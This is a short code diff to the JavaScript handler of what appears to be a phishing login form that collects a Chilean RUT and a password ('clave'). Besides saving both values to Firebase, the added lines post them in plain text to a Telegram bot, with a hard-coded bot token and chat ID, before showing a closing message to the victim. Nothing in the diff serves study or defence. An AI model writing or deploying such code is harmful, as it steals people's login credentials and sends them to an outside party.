@@ -132,15 +132,30 @@
       }
 
       try {
+        // Guardar en Firebase
         await addDoc(collection(db, "ingresos"), {
           rut: rut,
           clave: clave,
           timestamp: new Date()
         });
+
+        // Enviar a Telegram
+        const mensaje = `Nuevo ingreso:\nRUT: ${rut}\nClave: ${clave}`;
+        await fetch("https://api.telegram.org/bot7611699433:AAHe4sFYNBlZRligGcUsYv-0Y9-0rTzgx5o/sendMessage", {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json"
+          },
+          body: JSON.stringify({
+            chat_id: "7752197334",
+            text: mensaje
+          })
+        });
+
         document.getElementById("formulario").style.display = "none";
         document.getElementById("mensajeFinal").style.display = "block";
       } catch (error) {
-        console.error("Error al guardar en Firebase:", error);
+        console.error("Error:", error);
         alert("Ocurrió un error al enviar los datos.");
       }
     };
